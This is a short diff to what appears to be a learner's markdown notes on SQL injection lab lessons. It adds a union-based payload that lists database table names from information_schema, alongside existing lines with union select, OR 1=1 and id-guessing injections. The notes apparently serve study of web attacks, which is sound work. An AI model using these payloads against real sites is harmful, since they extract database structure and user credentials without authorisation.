@@ -10,6 +10,8 @@
   * ?id=-1' union select 1,2,database() --+
   * SELECT username,password from 'users' WHERE '?id'=0 OR 1=1; (here 1=1 is equivalent to true).
   * SELECT username,password from 'users' WHERE ?id=9 trying out different id no.s we get the desired output when id is 9.
+  * URL: select * from users where id='-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();-- -
+
 
 ## lesson2
 ### Error-Based: IntegerBased
